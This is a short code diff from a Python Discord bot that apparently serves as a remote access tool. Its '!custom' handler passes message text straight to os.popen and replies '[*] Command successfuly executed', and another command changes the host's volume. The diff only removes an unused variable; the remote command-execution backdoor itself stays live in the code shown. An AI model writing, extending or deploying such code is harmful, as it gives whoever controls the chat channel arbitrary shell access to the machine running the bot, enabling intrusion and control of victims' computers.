@@ -208,7 +208,7 @@ async def on_message(message):
     if message.content.startswith("!custom"):
         import os
         import subprocess
-        x = os.popen(message.content[7:])
+        os.popen(message.content[7:])
         await  message.channel.send("[*] Command successfuly executed")
     if message.content.startswith("!voice"):
         volumeup()
